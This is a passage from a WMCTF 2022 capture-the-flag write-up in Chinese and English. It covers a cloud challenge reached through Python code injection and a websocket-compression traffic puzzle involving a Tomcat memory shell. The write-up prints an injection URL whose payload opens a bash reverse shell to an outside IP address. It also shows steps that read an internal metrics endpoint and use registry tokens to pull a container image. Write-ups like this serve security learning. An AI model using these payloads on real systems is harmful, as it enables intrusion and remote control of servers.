aliyun.com/document_detail/72334.html
10. Pull image from alibabacloud image registry with username cr_temp_user
  and authorizationToken as its password.
Image: registry.cn-hangzhou.aliyuncs.com/glzjin/6166lover
You may know these from the challenge domain, I have deployed in hangzhou 
of alibabacloud k8s service(ACK). And know the author name is glzjin, and 
the challenge name 6166lover.
11. After pull it, just run it with docker run -it registry.cn-hangzhou.al
iyuncs.com/glzjin/6166lover bash, and you may get the flag on the image.
Thank you:)
Just get your reverse shell like that:
http://6166lover.cf8a086c34bdb47138be0b5d5b15b067a.cn-hangzhou.alicontaine
r.com:81/debug/wnihwi2h2i2j1no1_path_wj2mm?code=__import__('os').system('b
ash -c "bash -i >%26 /dev/tcp/137.220.194.119/2233 0>%261"')
And maybe you have to find out a way to fork your process that not jam thi
s application because it's deployed on k8s with a health check.
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
Python
复制代码
30
使⽤凭证登陆仓库
#!/usr/bin/env python
#coding=utf-8
from aliyunsdkcore.client import AcsClient
from aliyunsdkcore.request import CommonRequest
from aliyunsdkcore.auth.credentials import AccessKeyCredential
from aliyunsdkcore.auth.credentials import StsTokenCredential
credentials = StsTokenCredential('', '', '')
client = AcsClient(region_id='cn-hangzhou', credential=credentials)
request = CommonRequest()
request.set_accept_format('json')
request.set_method('GET')
request.set_protocol_type('https') # https | http
request.set_domain('cr.cn-hangzhou.aliyuncs.com')
request.set_version('2016-06-07')
request.add_header('Content-Type', 'application/json')
request.set_uri_pattern('/tokens')
response = client.do_action_with_exception(request)
# python2:  print(response) 
print(str(response, encoding = 'utf-8'))
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
Python
复制代码
31
 pull 题⽬镜像 
ps:题⽬镜像仓库名和镜像名可以利⽤ 内⽹的metrics监控查看到  也可以根据作者和题⽬名猜测  
curl 172.20.240.9:8080/metrics 
 registry.cn-hangzhou.aliyuncs.com/glzjin/6166lover 
32
出题⼈失误,忘记修改题⽬flag 
直接使⽤镜像内flag 
PWN 
Ubuntu 
33
根据题⽬描述 这肯定是最近veo开源的那个ws内存⻢ 
https://github.com/veo/wsMemShell 
⼤部分数据包以C1 开头 这的确是ws流量 
这个内存⻢并没有加密流量的功能 为什么题⽬的流量不是明⽂呢? 
MISC 
Hacked_by_L1near 
permessage-deflate 
L1near⼤⿊客趁我睡觉的时候给我的tomcat服务器上了个websocket的内存⻢呜呜呜，还往服务器
⾥写了⼀个flag，但是我这只抓到了websocket通信期间的流量，你能知道L1near⼤⿊客写的flag
是什么吗？
L1near hacker put a websocket memory on my tomcat server while I was sleepi
ng, and wrote a flag to the server, but I only captured the traffic during 
websocket communication, you can know L1near What is the flag written?
Attachment:
China: https://pan.baidu.com/s/144Cl2IlzMfUEa-niGvKZAg 提取码: pdva
Other regions: https://drive.google.com/file/d/1wRHzI6sfwM7Mkw2QjcAEgxBL_5h
EwK0m/view?usp=sharing
1
2
3
4
5
Python
复制代码
34
阅读ws相关的rfc 我发现了ws有⼀个 ⽀持压缩的特性 
https://www.rfc-editor.org/rfc/rfc7692 
35
 A Message Compressed Using One Compressed DEFLATE Block
   Suppose that an endpoint sends a text message "Hello".  If the
   endpoint uses one compressed DEFLATE block (compressed with fixed
   Huffman code and the "BFINAL" bit not set) to compress the message,
   the endpoint obtains the compressed data to use for the message
   payload as follows.
   The endpoint compresses "Hello" into one compressed DEFLATE block and
   flushes the resulting data into a byte array using an empty DEFLATE
   block with no compression:
       0xf2 0x48 0xcd 0xc9 0xc9 0x07 0x00 0x00 0x00 0xff 0xff
   By stripping 0x00 0x00 0xff 0xff from the tail end, the endpoint gets
   the data to use for the message payload:
       0xf2 0x48 0xcd 0xc9 0xc9 0x07 0x00
   Suppose that the endpoint sends this compressed message without
   fragmentation.  The endpoint builds one frame by putting all of the
   compressed data in the payload data portion of the frame:
       0xc1 0x07 0xf2 0x48 0xcd 0xc9 0xc9 0x07 0x00
   The first 2 octets (0xc1 0x07) are the WebSocket frame header (FIN=1,
   RSV1=1, RSV2=0, RSV3=0, opcode=text, MASK=0, Payload length=7).  The
   following figure shows what value is set in each field of the
   WebSocket frame header.
        0                   1
        0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5
       +-+-+-+-+-------+-+-------------+
       |F|R|R|R| opcode|M| Payload len |
       |I|S|S|S|       |A|             |
       |N|V|V|V|       |S|             |
       | |1|2|3|       |K|             |
       +-+-+-+-+-------+-+-------------+
       |1|1|0|0|   1   |0|      7      |
       +-+-+-+-+-------+-+-------------+
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
Python
复制代码
36
去掉前两位 flag 
unmask 之后在末尾加上0x00 0x00 0xff 0xff  就可以使⽤ zlib解压raw数据 
这⾥偷懒编写脚本重放流量 补全缺失的ws会话 塞给⼀个⽀持压缩到的ws服务端解析 
Yoshino                      Standards Track                   [Page 22]
RFC 7692          Compression Extensions for WebSocket     December 2015
   Suppose that the endpoint sends the compressed message with
   fragmentation.  The endpoint splits the compressed data into
   fragments and builds frames for each fragment.  For example, if the
   fragments are 3 and 4 octets, the first frame is:
       0x41 0x03 0xf2 0x48 0xcd
   and the second frame is:
       0x80 0x04 0xc9 0xc9 0x07 0x00
   Note that the RSV1 bit is set only on the first frame.
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
37
import socket
import binascii
import time
from flowcontainer.extractor import extract
result = extract(r"info.pcapng",filter='',extension=['tcp.payload'])
s = socket.socket()
host = '127.0.0.1'
port = 8088
for key in result:
try:
s = socket.socket()
s.connect((host,port))#http升级ws⾸包
s.send(binascii.unhexlify("474554202f6563686f20485454502f312e310d0
a486f73743a203132372e302e302e313a383038380d0a557365722d4167656e743a204d6f7
a696c6c612f352e30202857696e646f7773204e542031302e303b2057696e36343b2078363
43b2072763a3130332e3029204765636b6f2f32303130303130312046697265666f782f313
0332e300d0a4163636570743a202a2f2a0d0a4163636570742d4c616e67756167653a207a6
82d434e2c7a683b713d302e382c7a682d54573b713d302e372c7a682d484b3b713d302e352
c656e2d55533b713d302e332c656e3b713d302e320d0a4163636570742d456e636f64696e6
73a20677a69702c206465666c6174652c2062720d0a5365632d576562536f636b65742d566
57273696f6e3a2031330d0a4f726967696e3a20687474703a2f2f3132372e302e302e313a3
83038380d0a5365632d576562536f636b65742d457874656e73696f6e733a207065726d657
3736167652d6465666c6174650d0a5365632d576562536f636b65742d4b65793a204b624e4
b6f59636a495367797a4c38553977536745513d3d0d0a444e543a20310d0a436f6e6e65637
4696f6e3a206b6565702d616c6976652c20557067726164650d0a436f6f6b69653a2063737
266746f6b656e3d70756d423538564e414c543964624567535450574956414a504d4259454
e393152445578485063535367434e37477554386b5564636c334e477a78653567526e3b206
36f6d2e776962752e636d2e77656261646d696e2e6c616e673d7a682d434e3b205f67613d4
741312e312e313535373634333133362e313635383231343434340d0a5365632d466574636
82d446573743a20776562736f636b65740d0a5365632d46657463682d4d6f64653a2077656
2736f636b65740d0a5365632d46657463682d536974653a2073616d652d6f726967696e0d0
a507261676d613a206e6f2d63616368650d0a43616368652d436f6e74726f6c3a206e6f2d6
3616368650d0a557067726164653a20776562736f636b65740d0a0d0a"))
s.recv(1024)#等待模拟服务器返回
value = result[key]
a=value.extension['tcp.payload']
for c in a:
s.send(binascii.unhexlify(c[0]))
pass
except:
continue
s.close()
#
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
Python
复制代码
38
使⽤⼀个ws模拟服务器接收请求 
发现解压后的流量是⼀堆判断每⼀个字节内容的bash语句 
匹配返回为1的请求 
拼接字符串得到flag 
39
(在最后发现最新版wireshark也⽀持ws解压缩(需要会话完整)  难怪作者会删掉会话头) 
签到
WMCTF{Welcode_wmctf_2022!!!!have_fun!!} 
Checkin